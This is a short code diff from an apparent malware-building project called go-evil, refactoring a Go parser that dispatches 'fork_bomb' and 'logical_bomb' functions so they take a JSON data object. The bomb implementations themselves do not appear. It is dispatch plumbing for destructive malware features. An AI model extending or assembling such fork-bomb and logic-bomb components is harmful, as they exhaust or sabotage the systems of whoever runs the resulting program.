@@ -5,25 +5,25 @@ import (
 
 	"github.com/TeamPhoneix/go-evil/domains/bombs/fork"
 	"github.com/TeamPhoneix/go-evil/domains/bombs/logical"
+	"github.com/TeamPhoneix/go-evil/utility/structure/json"
 
 	"github.com/s9rA16Bf4/notify_handler/go/notify"
 )
 
-// The main parser for the Infect domain
-func Parser(function string, value string, s_json string) ([]string, string) {
+func Parser(function string, value string, data_object *json.Json_t) []string {
 	call := []string{}
 
 	switch function {
 	case "fork_bomb":
-		call, s_json = fork.Bomb(value, s_json)
+		call = fork.Bomb(value, data_object)
 
 	case "logical_bomb":
-		call, s_json = logical.Bomb(value, s_json)
+		call = logical.Bomb(value, data_object)
 
 	default:
 		notify.Error(fmt.Sprintf("Unknown function '%s'", function), "bombs.Parser()")
 
 	}
 
-	return call, s_json
+	return call
 }
